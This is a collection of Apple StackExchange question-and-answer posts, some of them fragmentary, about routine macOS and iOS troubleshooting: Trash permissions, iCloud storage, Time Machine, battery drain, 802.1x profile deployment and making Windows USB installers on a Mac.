2\nSCRIPT\n\nI used the delay 5 in to provide time to start the screen saver for testing—not important to its function.\n", "Q: Messages when attempting to empty Trash in macOS I getting these message when attempting to empty my trash in Mac:\nCinna-MacMini:.Trashes stevechang$ rm -rf 502/sda/\nrm: 502/sda//Cinna Macmini/Users/stevechang/Library/Application Support/Manroling/Manroling.app: Operation not permitted\nrm: 502/sda//Cinna Macmini/Users/stevechang/Library/Application Support/Manroling: Operation not permitted\nrm: 502/sda//Cinna Macmini/Users/stevechang/Library/Application Support: Permission denied\nrm: 502/sda//Cinna Macmini/Users/stevechang/Library: Permission denied\nrm: 502/sda//Cinna Macmini/Users/stevechang: Permission denied\nrm: 502/sda//Cinna Macmini/Users: Permission denied\nrm: 502/sda//Cinna Macmini: Permission denied\nrm: 502/sda/: Permission denied\n\nWhat does the messages mean?\n\nA: Well, the messages are pretty straight forward I suppose, you do not have the correct permission to remove these files. \nI am however a bit confused as to the term \"empty Trash\".

It happened last Sunday, March 31, 2019, I was about to send a photo thru messenger when I noticed that the picture selection wouldn't load. So I checked out photos and found out I couldn't view them. There's a note on the bottom that it's restoring. I haven't been able to find any fix to problem, please help. Thanks.\nPS: I can take photos or screenshots but I do not know if they are actually saved.\n\n\nA: Try out from the following options to make it work:-\n\n\n*\n\n*Reset Network Settings\nThere is a chance that the culprit is the networking. To be specific, your iPhone is syncing photos to the cloud. Yet, the networking is not fine. Thereby, you see that it keeps deleting and restoring photos. Under this circumstance, you should reset network settings. Just go to “Settings” > “General” > “Reset” > “Reset Networking Settings”. Then, enter your password and confirm “Reset Networking Settings”.\n\n*Turn off Cellular Data\nMoreover, this issue may result from unstable or malfunctioning Cellular Data. Therefore, you can try to fix it by turn off cellular data. Just Launch “Settings” app. Then, in the new screen, you can tap the “Cellular” option. In subsequent “Cellular” screen, you need to tap the green switch beside the “Cellular Data”.\n\n*Turn on Airplane Mode\nIf you encounter this issue when you attempt to import files, you can solve it by turning on “Airplane Mode”. Likewise, get access to the “Settings” application on your iPhone. Then, locate the first “Airplane Mode” option and tap on the switch next to it.\n\n*Change iCloud Settings\nWhat’s more, there is a likelihood that the criminal is improper iCloud settings. On your Mac, get into “System Preferences” > “iCloud” and uncheck the “Photos”. Then, in “System Preferences”, go to “iCloud” > “Photos” > “Options”, and next uncheck “My Photo Stream” and “Photo Sharing”. After that, in your iPhone, you should delete the account for iCloud. After that, re-sync iOS device with iTunes. Finally, set up an iCloud account on your iPhone again.\n\n*Update iOS System\nFurthermore, this problem can occur from iOS system bugs. As we all know, older iOS will always contain some bugs. Hence, you should check the version of your iPhone system. If it isn’t the latest version, you have to update it. You can go to “Settings” > “General” > “Software Update”.\n\n*Reset All Settings\nAssuming that all the above solutions cannot help you, you can try the “Reset All Settings” option. This can eradicate multiple system issues. But, it should be the last resort in that it will erase all of your iPhone data. Hence, you had a better back up your iPhone in prior to “Reset All Settings\". It can save you from difficult data recovery, similar to Outlook recovery on PC. After backup, just go to “Settings” > “General” > “Reset” > “Erase all Contents and Settings”.\nSource:- https://www.datanumen.com/blogs/6-solutions-iphone-keeps-deleting-restoring-photos/\n", "Q: Why is my external disk being backed up again by Time Machine?

However, you should be worried if you are using your Apple ID password as the device password and the person attempts to enter it when asked for Apple ID password when attempting to reset your device.\nThe person can however disable/enable iCloud services such as Contacts/Photos/Safari/Calendar sync etc. with access to device passcode.\n\nWill it reset my Face ID?\n\nIt is also possible for them to remove Face ID data with access to device passcode.\n", "Q: Where is the iCloud data on a third-party iOS app stored? I would like to see the data stored by a third-party iOS apps via iCloud. I tried to access the following filepath on my Mac:\n\n~/Library/Mobile Documents/APP-IDENTIFIER/\n\nHowever, under the app-specific directory there is no file but an empty directory named Documents. That said, there should be a file at other part, since the iCloud data must be stored and synced elsewhere.\nSo where is the iCloud data that the third-party apps use on iCloud stored, and how can I access it? \n\nA: The ~/Library/Mobile Documents/ folder only contains data that is stored in your iCloud Drive. \niCloud is an umbrella marketing name that also covers other services that are not implemented in the same manner as iCloud Drive. Apps that store data in iCloud directly often do so via iCloud CloudKit. iCloud CloudKit is a service provided by Apple that makes it easier for app developers to store and sync data. As the lower tiers are provided for free by Apple, it is a relatively popular service.\nWhen apps store data in iCloud via CloudKit it is not generically accessible to the user. The app itself needs to provide an interface for accessing the data before you as the user can access the data.\nIf no such interface exists within the app, you have to contact the app developer to request such an interface.\nIf you're a citizen of the European Union, you might have luck sending the app developer a GDPR request for your data. That is often a one-time, manual process however.\n", "Q: Can you use a bootable macOS USB created on a MacBook pro, to install macOS on another MacBook Pro? So my friend has a 2011 MacBook Pro. The laptop's hard drive crashed and no longer works. He bought a new SSD as a replacement, but he doesn't have a way to install macOS on this new SSD, because he cannot create a bootable USB from his old hard drive.\nI have a 2009 MacBook Pro running OS X El Capitan on it. Can I use my MacBook Pro to create a bootable USB with OS X El Capitan on it? So my friend can use this bootable USB to install OS X El Capitan on his MacBook Pro.\n\nA: Yes, it is perfectly normal to create a macOS bootable installer USB key on one Mac and use it to install macOS on any other Mac.\nThe bootable installer is not customized for a particular Mac hardware, can be used to install macOS on any Mac that supports running the particular version of macOS.\nYou can use your 2009 MacBook Pro to download OS X El Capitan installer from this link:\n\n\n*\n\n*OS X El Capitan\n\n*How to upgrade to OS X El Capitan\nAfter downloading the installer, you can follow the below instruction to create to create a bootable USB installer:\n\n\n*\n\n*How to create a bootable installer for macOS\n", "Q: Automatic Deployment of 802.1x profile for Wi-Fi I am wondering if there is a process that people use here to deploy 802.1x profiles in a Windows AD environment on Apple hardware specifically MacBook Pros?\nSpecifically when the Root CA is renewed and profiles need to be deployed. I have read up on some techniques here:\n\n\n*\n\n*https://www.reddit.com/r/macsysadmin/comments/9ugsq9/macos_8021x_authentication/\n\n*https://community.cisco.com/t5/identity-services-engine-ise/how-to-automate-process-when-deploying-dot1x-between-ise-and-mac/td-p/3749868\n\n*https://support.apple.com/kb/HT4784\nThese either mention a third party or the information is outdated. I may be missing something but any help would be greatly appreciated.\n\nA: So the solution I came up with isn't perfect but it beats a lot of the stuff I was reading online. I decided to use Ansible to remotely config the mac computers. Ansible uses ssh which most macs in our environment have turned on by default. I would recommend deploying an Ansible service account user to macbooks in order to do the following tasks. I want to iterate that this task is because we are using a Windows CA and the profiles need to be reloaded IF the Windows CA cert expires. The issue that we have had is that the laptops will not connect to 802.1x without said mobile config. The solution here is to have the macbooks connect to the network through a guest wifi and then vpn into the network. Preferably a guest network that your company has that is separate from internal resources.\nWe will use the following Ansible playbook to make sure we remove the old profile and then transfer over the old profile. Apple does allow you to install mobile configs via the command line but I could not get it to work so a manual install of the profile is necessary post transfer but the hard steps are done.\nHere is the playbook and the remove profile script.\n# Remove mac Profile\n\n- name: Transfer and execute a script\n  hosts: all\n  user: USER\n  sudo: true\n  tasks:\n\n     - name: Execute the script\n       script: /home/USER/ansbile-play/removeProfile.sh\n\n     - name: Execute transfer of mobile config\n       copy:\n         src: /home/USER/MacMobile.mobileconfig\n         dest: /Users/Shared/\n         mode: 0644\n\n\n #!/bin/bash\nsudo /usr/bin/profiles -P | grep com.apple.mdm | awk -F'profileIdentifier:' '{print $2}' | awk '{sub(/^[ \\t]+/, \"\"); print}' > test\ntestvar=$(cat test)\nsudo /usr/bin/profiles -R -p $testvar\nsudo rm test\n\nAfter having this config you will need to have a hosts file with the hosts you would like to deploy to. Manually doing this is a pain so I suggest dynamically creating it off Active directory or however you manage computers.\nHere are some resources I used to solve this proble https://docs.ansible.com/ansible/latest/index.html\nhttps://serversforhackers.com/\nThis is not a perfect solution and my code is also not perfect.

When it is killed, the following is output to the console:\n[1] 69923 killed grep --color=auto --exclude-dir={.bzr,.cvs,.git,.hg,.svn} $string *\n\nIs there a way to check the kernel logs to see why this is? In linux I would got to /var/log/kern.log to see if it is an OOM issue but I am not sure what to do on osx. If it isn't an oom issue, I am not sure what could be causing this, so other hypotheses are welcome.\n\nA: *\n\n*Logs are in /var/log/System.log, you can also access them by running Console.app\n\n*Memory consumption of a process can be checked in Activity Monitory.app, at least as long as the process is running\n\n\nA: The error message you see means that something else sent the grep command a kill signal. This does not usually happen by itself.\nSent signals are generally not logged to any log file, so you won't find it in /var/log/System.log for example.\ngrep doesn't use a lot of memory, so it is extremely unlikely to be due to a OOM issue. In addition, if it were, you wouldn't be getting the \"killed\" error message - instead grep would fail with one of these error messages: \"malloc\", \"calloc\" or \"realloc\".\nThe reason why your grep command is being killed seems to be that you have run it \"inside\" something else that manages it. It could be a Laravel worker queue, a Python pool system, a PHP worker system, etc. - there are many possibilities. You'll have to look at the documentation for the system you're using to get information on why it kills programs. Usually this is due to default timeouts.\n\nA: The first thing I'd try would be examining the return value. \n$?  #in zsh, should be the same in bash. \n\nSince you are running this in the shell, you should be able to see it in launchd. Try:\nlaunchctl list #the easiest invocation\n\nYou get 2 rows, first row is the PID, second is the exit status. \nThe proper invocation is:\nlaunchctl print gui/$UID/  # for processes run in the gui. \n\nSame deal, running jobs have a pid, and the second column is the exit code. If it's negative then that's the signal that it caught.\nYou can also just hit CMD-I, and watch the thing run in the terminal inspector. Click on the gear to show the program arguments. I often watch Homebrew update this way.\nOnce upon a time ( pre SIP )  you could just use DTrace:\nman kill.d # man -k DTrace to see them all\n\nThis would be the first thing I'd try, it'll tell you which process sent the signal. Alas, Apple has crippled this excellent collection of tools. It'll work for sure if you disable SIP, but if you have the stomach for it, you can drink directly from the hose:\nsudo fs_usage -w  # So many things running. :(\n\nYou'll get your answer this way. \nYou'll see your grep die, and you'll see who killed it. \nGood luck.\n", "Q: Partition Type: FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF no backup trying to delete a disk partition, the disks utility has given an error and now the Macintosh HD volume was not in APFS.\nBut of course, being different, does not match anything with mine.

I’d like to know what each of the 3 antennas do.  I know one is a shared antenna (Bluetooth and WIFI) and that the other two are WIFI antennas.  What’s the difference? Why several WIFI antennas instead of just one?  Are ones for 5GHz and others for 2.5GHz?  Are ones for receiving and others for transmitting?\n\n\nA: In general, WiFi uses the same antenna for both transmitting and receiving.\nIn general, multiple WiFi antennas are used to get higher capacity (i.e. higher bandwidth). For example a common setup is 3x3 MIMO (multiple-input and multiple-output) where 3 antennas are used to exploit multipath propagation in order to increase the bandwidth available.\nIn very rough terms the idea is that there's a limit to the data rate, you can send/receive at a certain frequency with the technology available. Instead of increasing the data rate, MIMO uses multiple antennas to send multiple data streams at the same time on the same frequency, but from different antennas. \nThe receiver can then through advanced signal processing seperate the three signals even though they're sent at the same frequency, because they arrive at the receiver in three different directions.\nThis idea makes it possible to reach higher data speeds over a 3 antenna link than one with just 1 antenna.\nRegarding 2.4 Ghz vs. 5 Ghz - it is the case that some MacBook Pro models use one antenna for 2.4 Ghz and the two others for 5 Ghz. Other MacBook Pro models use all antennas for both frequencies.\n", "Q: What are the drawbacks to reformatting my hard drive back to Mac OS Extended (Journaled) from APFS I am concerned about not being able to use Time Machine to back up my drive. I've been told that was due to my disk being formatted as APFS. What must be done to return my Mac to Mac OS Extended (Journaled) format. Will this solve the sudden stopping of Time Machine?  Is there a better way to get Time Machine working on my computer. \nI have an older iMac running High Sierra.\n\nA: The external drive used to store Time Machine backups must be formatted with HFS+, also known as Mac OS Extended (Journaled). If the external drive is formatted with APFS, it cannot be used for storing Time Machine backups.\nThe internal drive in your Mac used to contain the macOS operating system can be formatted with either APFS or HFS+. Both choices will support backing that computer up with Time Machine.\nIf your computer was automatically converted to APFS with the upgrade to High Sierra this has nothing to do in itself with your Time Machine problem. Such a system is still supported to be backed up with Time Machine.\nIf you want to reverse the automatic conversion from HFS+ to APFS, you'll need to backup the system, reformat the computer with HFS+ and then restore from the backup (or reinstall a new macOS operating system if you haven't got any data to save). Unfortunately there's no automatic conversion program from APFS to HFS+.\nNote that such a conversion from APFS to HFS+ does not in itself improve your Time Machine situation.\n", "Q: How to disable certificate transparency check in macOS Mojave(10.14) In macOS Mojave, certificate transparency check is enabled. Because the OS terminates all TLS connections that doesn’t use transparent certificates, macOS Mojave cannot connect to WPA2 Enterprise corporate networks. Is there any solution to turn off certificate transparency check for one special certificate or for all certificates?\n\nA: Certificate Transparency only applies to publicly trusted certificates, which mean WPA2 certs aren’t affected by CT.\nIt’s probably because the certificate was signed with MD5, which isn’t trusted, starting from iOS 12 and macOS Mojave.\nThe reason why MD5-signed certs aren’t trusted is because MD5 weaknesses allow fake TLS certs to be created.\nThere is simply no such way to make macOS Mojave to make trust MD5 certs; request the network administrator to update & resign the cert with a different algorithm.\n", "Q: How can i change Terminal Settings to automatically close terminal after Execution using shell script when i execute some command file or shell file after execution terminal remains open and its not look appropriate i want to close the terminal by script without changing settings manually in MAC\nplease help..\n\nA: You can exit the terminal by calling to two commands after each other, execute script and then exit\n$> myScript.sh && exit\n\n", "Q: Trying to find out what is draining the battery on my MacBook Pro I am trying to figure out what is draining battery on my Early-2015 Retina MacBook Pro overnight. I close the lid and leave it in sleep state overnight. The next morning, quite often I find that almost 70-80% of the battery has drained. What is surprising is that on some mornings, I find that only 10-20% of the battery has drained. \nI have the same model MacBook Pro at home too. Both have the same issue. \nOS: macOS Mojave (10.14.2)\nBattery cycle count (or work machine): 217\nBattery condition: Normal.\nI use an external mechanical keyboard while working, but unplug it before I leave. I do have a USB wireless mouse. The receiver for the mouse remains plugging in, but I turn off the power switch for the mouse. \nIn energy save preferences, I do not have power nap enabled. \nHow can I go about finding out what often drains the battery? \nThank you.\n\nA: If you have \"Find My Mac\" enabled, macOS will keep persistent TCP connections even when it \"sleeps\" (not really sleeps then). This draws battery, sometimes a lot. You can check if it is on with terminal:\npmset -g | grep -i tcp\n\nSee if you have:\n  tcpkeepalive         1\n\nIf it is so, you cannot really do much unles you turn off \"Find My Mac\" (with all risks that it involves).\nAlso it is possible that something on your mac prevents it from sleeping. Typically you can find it with pmset -g assertions. It will tell you what keeps your mac awake. Mine, for example, is kept awake by bluetooth keyboard and touchpad all the time. Sometimes there are also processes stuck and keeping my mac awake for no reason. Then I just kill them.\nIn general, you may keep your macbook on power adapter for most of the time despite people telling you that you should not. I had a number of macbooks in my household since 2007 and almost always kept them on power adapter. In the end they were too old or failed for any reason but never due to battery. The worst battery performance I had was about 75%. Most of them were > 80% capacity after several years.\n\nA: I had the same issue. To rectify it I ran the following commands in terminal.\npmset -g\n\nTo get my current settings. Saved the info from above command somewhere safe if you need to go back for reference.\nThen ran the following commands in terminal.\n$ sudo pmset -a hibernatemode 25\n$ sudo pmset -a standbydelaylow 1800\n$ sudo pmset -a standbydelayhigh 1800\n\nYou can read about these settings here. \nYou can read about hibernate modes here.\nAs always proceed with caution when applying these settings.

The data to be searched is also within the same Numbers document, but in a separate tab.\nI’m sorry if this question seems like I haven’t shown any research efforts, but so far I’ve searched within Numbers Help, Apple’s Numbers support pages and done general Google searches. These haven’t produced any results either way, so I think maybe what I want to do isn’t possible. \nCan someone hear confirm either way?  If possible, how do I achieve this?\nMORE INFO\nMy Numbers document contains two tabs. The 1st tab is called Search and the 2nd tab is called Data.\nI would like the search box to be in cell B5 of the Search tab.\nThe data being searched is located in Column B of the Data tab, from rows 2 to 4,500.\nThe search results should appear below the search box.\n\nA: All steps in this answer need to be carried out on your Search sheet. There is no need to touch your Data sheet.\n\n\n*\n\n*First make sure you have at least 4,506 rows available in your Search Sheet. The reason for this number is that we're allowing enough room below your search field for all of the corresponding rows of data you have.\n\n*In Cell G7 enter the following formula and press return:\n=Data::Table 1::B2\nNOTE: This formula is just telling Numbers to populate Cell G7 with whatever data is in Cell B2 in your Data sheet, since this is the first cell containing the data you want to be searchable.\n\n\n*Now select Cell G7 and you will notice a yellow handle at bottom centre of the cell. Drag this down to row 4,506. This will copy the formula down all the rows, incrementally changing each one to refer to Cell B3, B4, etc.\n\n*In Cell F7 enter the following formula and press return:\nIFERROR(SEARCH($B$5,G7)+ROW()/5000,\"\")\nNOTE: The $B$5 refers to your search field. You will need to change this if you decide to use a different cell for your search box. The 5000can be 10000 or 100000, it doesn't really matter.\n\n\n*Now select Cell F7 and drag the yellow handle down to row 4,506. Once again this copies the formula down all the rows, incrementally changing each one.\n\n*In Cell E7 enter the following formula and press return:\nIFERROR(RANK(F7,$F$7:$F$4506,1),\"\")\n\n\n*Now select Cell E7 and drag the yellow handle down to row 4,506. Once again this copies the formula down all the rows, incrementally changing each one.\n\n*In Cell A7 enter the value '1', in Cell A8 the value '2', and so on for whatever number of search results you want returned. For example, if you want to have up to 10 search results displayed, then work your way down to Cell A16 which will contain the value ’10'.\n\n*In Cell B7 enter the following formula and press return:\nIFERROR(VLOOKUP(A7,$E$7:$G$4506,3,FALSE),\"\")\n\n\n*Now select Cell B7 and drag the yellow handle down to whatever row corresponds with the last number you entered at Step 8 above. For example, if you opted for 10 search results, you’d drag the handle down to Cell B16.\n\n\nNow all of the hard work is done. If you place the cursor into Cell B5 you should be able to enter a search term in order to conduct your search. Assuming you wanted up to 10 search results, when you enter a search term in Cell B5 you will get anywhere between 0 and 10 search results, even if your data contains more than 10. So make sure at Step 8 you’ve allowed enough rows for the potential number of search results.\nBelow is an animated GIF of how this works in a dummy workbook I created that resembles your description:\n\nNOTES: \n\n\n*\n\n*You may want to hide columns E, F and G so you don’t see the workings of the search functionality. Alternatively, you could format these columns so that all text matches the background colour of the cell, so that you don’t see all of the clutter. \n\n*If over time you add data to your Data sheet, then the number of rows in your Search sheet will need to change, as will the 4506 used in the formulas.\n", "Q: Upgrade to an unsigned version of iOS - possible or not? I have an iPhone 5s (A1453). It is currently running iOS 9.x.\nI need to upgrade it to iOS 11.x to perform testing of apps on this particular iOS version/device combination.\nI've read couple of articles about a method with Prometheus, SHSH2, etc.\nBut it seems that I'm out of luck, because this device never had iOS 11 installed on it, so there's no SHSH2 for this version, and it is already unsigned. \nAm I right with my guess, or is there some way to do such an upgrade?\n\nA: No. It is not possible to installed an unsigned version of iOS.\nThe only version you can upgrade your iPhone 5s to is the current latest available for the device which is iOS 12.2.\nIf you have the source code for the app that you wish to test on iOS 11, you can test the same by building it for iPhone 5s Simulator running iOS 11 (you can test the software based features but not all of the hardware based features this way).\n", "Q: Software update wants to install Command Line Tools. Why? I have no Xcode installed After the MacOS 10.14.4 Update, softwareupdate also shows me the following as a further update/ download:\nCommand Line Tools (macOS Mojave version 10.14) for Xcode 10.2\nNow if I need it, I am fine installing it. I am wondering why I need it though, since I don't have Xcode installed, and am not developing software in any sense.\nSo why does softwareupdate show me this, and should I download it?\n\nA: With macOS it is possible to install the command line tools for Xcode seperately from Xcode.\nIf you did have Xcode installed, the command line tools would be updated with Xcode updates. As you haven't got Xcode installed, these tools are updated from Software Update alongside macOS updates instead.\nInstallation of the command line tools is triggered by running one of the included programs from the Terminal or via a third party app. The first time that is done, you're asked if you want to install the command line tools, and then everything in that package will be installed.\nThis is commonly done when installing for example Homebrew, MacPorts, or similar software. It is also used together with lots of open source and other third party software. The command line tools are not only for developing software, but contain many utilities that are of value generally.\n", "Q: How to create a Windows 10 or Windows 11 bootable USB on a Mac for PC without Bootcamp, when install.wim is too large My Boot Camp assistant seems to be having problems (first I get not enough space, 40 GB, etc.) which I fixed by making a partition using Disk Utility, but then I didn't get an option that others seem to get to Create a usb bootable drive for windows 7 or later. It right away asked for the ISO and started downloading Windows support software, took forever, and then said there wasn't enough space on the partition (there was).\nWithout Boot Camp, I tried using dd and that didn't work and just reformatting the USB drive to exFAT (FAT32 didn't seem to work, because the October 2018 update has a file over 4 GB, meanwhile I'm downloading April 2018). What happens is that once I boot up the PC, change the boot order and then select the drive, it just goes back to some VMware kernel OS that was still on it when I got the PC. I've tried running in legacy mode, secure boot is disabled. \nDoes anyone have any alternatives I could use?\nAlso I tried plugging the usb (formatted exFAT in to my mac and it seems to recognize it  in the  boot menu, so I'm starting to think it's something with my motherboard/bios settings).\n\nA: There is an open-source package called wimlib that can create, extract, and modify Windows Imaging (WIM) archives. You can install this library on macOS via Homebrew:\nbrew install wimlib\n\nAfter that, you can use following wimlib command to split the wim file:\nwimlib-imagex split /win10-iso-path/sources/install.wim /Volumes/MYUSB/sources/install.swm 3000\n\nThe 3000 means the file should be split into 3000 MB-sized chunks so it can sit on FAT32 partition.\nThis should work most of time. However, I heard the usb might not be bootable after copying. Hence, you can directly create Windows 10 bootable USB on Mac (Catalina example)by burning the ISO image to USB and there is no need to extract the ISO. However, you should format the USB to exFAT instead.\n\nA: So, I needed to use FAT32 for my BIOS to accept it, but both the April 2018 and October 2018 updates had an install.wim file that was over 4 GB (I downloaded the English international version for both, maybe other versions are different?). So I needed to split the file. Here is how I did it for anyone else who has this problem.\nI found this amazing guide for it (https://www.tenforums.com/tutorials/103340-dism-split-install-wim-file.html), but it was for Windows so I had to adapt it. I used split terminal command to split the install.wim file.\nsplit -b 3700m /Volumes/CCCOMA_X64FRE_EN-GB_DV9/sources/install.wim install.wim\n\nThis creates install.wimaa and install.wimab. I then moved all the ISO files to the FAT32 USB, but with the new install.wim files. This time, when I booted from the USB, I get the Windows boot media, but it obviously cannot find install.wim. So I go to the command prompt and follow the guide and type out the diskpart commands it says (I followed MBR).\nAfter that, I copied the contents of the USB drive to the Windows 10 volume that I created from the guide (I think I used xcopy, but there's other commands for it). Navigated to that volume, went to the sources folder and typed the commands:\ntype install.wimaa install.wimab > install.wim \n\n(Once that finished, I deleted the old wimaa and wimab files)\ndel install.wimaa\ndel install.wimab\n\nAfter this I followed the rest of the guide, applied the image, add boot records (The disk volumes for me were different than what the guide should have given me, but that might have been a mistake on my part) and booted my pc back up after removing the USB. If it says operating system not found, this worked for me: https://www.wintips.org/fix-operating-system-was-n0t-found-error-on-windows-10-8-solved/.\nThis was so complicated for some reason and took me many hours to figure out.\n\nA: I found the only way for me to make it work was installing windows on VirtualBox, and then use Rufus in the virtual machine to create the bootable usb drive. A bit tedious but it works.  \n\nA: It sounds strange, but you can use simply two USB sticks, but without any terminal and brew magic:\n\n*\n\n*Format both USB sticks using macOS Disk Utility, USB stick A (>2 GB) with FAT32 and USB stick B (>8 GB) with exFAT.\n\n*Download the Windows 10 ISO and open it with macOS Finder.\n\n*Copy everything except sources folder onto USB stick A (drag and drop).\n\n*On the same USB stick A, create a folder called sources, and copy into it only the file boot.wim from the sources folder of the ISO\n\n*Copy everything from the ISO onto USB stick B.\n\n*Plug both USBs into the PC.\n\nThe computer boots from USB stick A and uses the missing files from USB stick B.\n\nA: The open-source package called wimlib, can also \"optimize\" a wim file.\nI managed to reduce the size bellow 4Go, my FAT32 usb thumb accepted it, and booted with success\nInstall wimlib via brew\nbrew install wimlib\nCopie the bigfile from the iso volume to your HD Disk (Download example by example)\ncp /Volumes/CCC.../sources/install.wim install.wim\nCompress the file\nwimlib-imagex optimize install.wim --solid\n\"install.wim\" original size: 4463411 KiB \nUsing LZMS compression with 8 threads \nArchiving file data: 9 GiB of 9 GiB (100%) done \n\"install.wim\" optimized size: 3311533 KiB \nSpace saved: 1151878 KiB\n\nYou may need sudo, because you could encounter an error like this:\n[ERROR] Can't modify \"/home/roger/win/sources/install.wim\": Permission denied \nERROR: Exiting with error code 71: \nThe WIM is read-only (file permissions, header flag, or split WIM).\n\nCopy the reduced file to your usb drive\ncp install.wim /Volumes/MYUSB/sources/install.wim\nBoot up !\n\nA: Microsoft offers two different methods of downloading Windows. The first is a simple download of an ISO file. The second method requires the download of a MediaCreationTool1809 application which then downloads Windows and installs to a FAT32 formatted USB flash drive. Since the MediaCreationTool1809 application requires Windows to execute, you can not use this method if you are running macOS. I suppose one could install a free copy of VirtualBox, then download the ISO. After creating a Windows virtual machine from the ISO, one could download and execute the MediaCreationTool1809 application in the virtual machine to create a USB Windows installer.\n\nThe files downloaded in the ISO by the first method are not the same as the files downloaded when the second method uses the MediaCreationTool1809 application.\n\nAs you already stated in your question, the ISO contains one file that is too large to fit on a FAT32 formatted flash drive. While ExFAT formatting can solve this problem, not all PC's can boot from ExFAT formatted flash drives. (However, newer Macs can boot fro ExFAT formatted flash drives.)\nThe English 64 bit April 2018 update does not have any files that would not fit on a FAT32 formatted flash drive.

Today i noticed that the iPad has \"popped', see photo here : https://imgur.com/a/AHAdkMM - Presumably the battery has swollen. \nHas anyone else had similar issues with an iPad in a wall mount on constant charge ? \nCan this be avoided by using a different charger rather than the POE adaptor ?\nIn another install i have the same setup, but power the iPad from the POE switch, i could programme the switch to turn off the POE for an hour every night at mid night would that be a good idea ?\n\nA: This always (eventually) happens if you use a Lithium battery long enough (and assuming nothing else breaks first). \nIt also happens prematurely and would be covered by AppleCare / Warranty even if you do everything right in less common circumstances.\nTo counteract this use newer hardware on iOS 11.3 or higher which have charge management features to optimize for always plugged in situations.\n\n\n*\n\n*https://support.apple.com/en-us/HT208710\nSecondly, the cooler you can keep the battery, the less likely thermal fatigue will accelerate aging and eventual failure, but this expansion or a refusal to charge ultimately happens even if you keep the device permanently cool and properly managed and charged.\nThe main thing you can control is when the battery discharges and when it charges. A lower wattage charger is probably marginally safer since it will generate less heat when charging since the charge takes longer, so I would possibly consider very lower wattage chargers if you had a fleet of 100 of these and never needed a fast charge and could get away with trickle or low charge rates.\nI wouldn’t change anything based on less than 3 or 4 failures since you’ll waste more time and resources swapping out chargers and not get much data in return. Once you’ve seen one iPad get a swollen battery, you’ll know how to gently touch the screen and detect the bulging before it separates the glass and get it in for diagnosis and a spare battery. Your failed unit or iFixit will show where on each screen to test for pressure / contact on the backside of the LCD panel.\nI like the idea of powering them down somewhat regularly, but I don’t have evidence that in a population it will make any difference whatsoever. For people that need the battery to work, keeping it used in all ranges of the charge / discharge cycle can probably help marginally - but if you always run on power, it won’t really matter if you have an accurate measure of charge status and could get away with every 6 months draining and wiping and setting them up so you know which are starting to age.\n\nA: Make sure you're using the latest version of iOS. iOS 11.3 and later on the iPad introduces a feature to preserve battery health for devices which are constantly plugged in, which is exactly your situation:\nAbout iPad and iPhone Charge Management Feature\n\n...when iPad or iPhone is connected to power for prolonged periods of time, such as when it is used in kiosks, point of sale systems, or stored in charging carts... When they remain at full charge for prolonged periods of time, battery health can be affected.\niPad with iOS 11.3 or later and iPhone XS, iPhone XS Max, or iPhone XR with iOS 12 or later include a charge management feature to help maintain battery health, which monitors these devices for use in these charging situations and, as required, reduces the maximum capacity of the battery...\n\n\nA: I use an iPad Mini as a always on weather station in our house. Just sits there displaying a weather app all day. \nI am using a Wemo smart plug and I have it programmed to turn off for a couple hours at night several days a week. That way the iPad wears down the battery (since the display is on the whole time).\nThe Ipad controls the wemo plug.\n", "Q: Touchbar Sending Virtual Keypresses to Amazon Workspaces I have a MacBook Pro with the touchbar and I use it to connect to Amazon Workspaces. Workspaces is essentially a Windows VM I connect to for Windows development. \nMy older MacBook worked great, but Workspaces does not recognize the function keys when I press them on the touchbar. I know this is partly an issue with Workspaces, as virtual keypresses sent via BetterTouchTool don't work either.\nHas anyone had other issues with the \"virtual\" function keys and found a way to get them to be recognized correctly, by apps that apparently only accept physical keypresses?\n\nA: I recently faced this problem and found a workaround. In the Keyboard settings, set the \"Touch bar shows\" to \"F1, F2, etc. Keys\". After this setting, my function keys are being recognized in Amazon WorkSpaces. Although it does not recognize F11 as it still shows desktop on Mac. You also lose firect access to App Controls.\n\n", "Q: Pause iTunes with the spacebar while the Mac is locked I must be missing something as Google turned up nothing on this and I can't be the only one annoyed by this:\nI have a MacBook Pro running Sierra 10.12.6.  I have iTunes on playing music all day for my work day, and frequently do work on a 2nd different computer.  After 15 minutes, my Mac automatically locks and starts the screensaver.  I mainly use the spacebar (on an external bluetooth keyboard) for Play/Pause in iTunes.  \nThe issue is that once the Mac is locked, the spacebar no longer pauses iTunes.  So I have to unlock the Mac just to pause music.  \nIs there any way around this?\n\nA: You can use the Play/Pause key (F8) on the keyboard to start/stop the playback. You can also play the previous track (F7) and the next track (F9), as well as adjust the Volume: mute (F10) decrease (F11) and increase (F12).\n\n", "Q: Texts from husband show as from myself I receive a notification indicating I have a new text from my husband - showing his name/contact.

We are on the same family share Apple ID.  Only my number is in Settings/Messages/Send & Receive and checked.  Not enjoying what appear to be text messages from myself.  lol.\n\nA: There are three ways a name shows up on iOS. \n\n\n*\n\n*Apple ID - if the sending phone is signed in with an AppleID that has your name - you will see that name and can’t change it on the receiving end. Sign out of iMessage and FaceTime on the sending device. Then sign in again with an account that isn’t in your name. \n\n*Your address book matches the email or phone number with iMessage (if blue) or sms (if green). You can clean your address book and fix the name. \n\n*All the other content. This one is harder to fix. \n\n\nThe last bucket uses spotlight index to search content on your phone and try to match that an email or message naming “Joe” also has joes email or phone number. Enough hits between the same name and number and iOS “suggests” who the message is from. \nIf you can upload a screen image of your device we might be able to help narrow down or show you how to tap on the name and get to the matching contact and clean this up. \n", "Q: Cannot disable option \"Copy files to iTunes Media folder when adding to library\" I want to disable the preference \"Copy files to iTunes Media folder when adding to library\" in iTunes Preferences > Advanced.\nHowever, every time I uncheck the box and click OK, it seems to refuse to disable this feature.

As I've had my iTunes library running over several years, I'm guessing that there may be some configuration bug somewhere.\n\n\n\nA: Seems to be some kind of bug. Only workaround I've found is to also disable \"Keep iTunes media folder organized.\"  When I untick this box, the other seems to stay disabled.  If I try to re-enable it, the \"Copy Files...\" re-enables as well.  They're linked somehow.

I ran into a similar situation just now. Despite already having those apps tied to my Apple ID, there's something about this having them pre-installed on my machine that breaks down.\nSimply delete those apps. You'll be able to redownload and update them from that same \"View My Account\" page with no issues after that.\nTip: For those unable to reinstall (work computer, etc.) if you simply delete then \"Move Back\" from the trash you will achieve the same result. \n\nA: I found it under Store > View My Account.\nThen click Accept.\nApparently this occurs when you have a new Mac that has certain apps (like Keynote) pre-installed, but you have also purchased them at some point in the past.

